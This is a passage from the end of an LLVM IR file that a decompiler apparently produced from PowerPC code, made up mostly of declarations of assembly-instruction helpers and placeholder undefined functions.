143, 144, 145, 146, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 269, 270, 271, 272, 273, 274, 275, 276, 277, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 332, 333, 334, 398, 399, 401, 402, 403, 404, 405, 406, 3, 4 }
}

declare i32 @__asm_rlwinm(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_rlwimi(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_rlwinm.(i32, i32, i32, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #0

declare i32 @__asm_mfcr() local_unnamed_addr

declare %1 @__asm_cror(i32, i32, i32) local_unnamed_addr

declare %0 @__asm_mtcrf(i32, i32) local_unnamed_addr

declare i4 @__asm_mcrf_cr0_read(i1, i1, i1, i1) local_unnamed_addr

declare i32 @unknown_0(i32, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8* @__decompiler_undefined_function_1() local_unnamed_addr

declare i8 @__decompiler_undefined_function_2() local_unnamed_addr

declare i16 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16* @__decompiler_undefined_function_4() local_unnamed_addr

attributes #0 = { nounwind readnone }
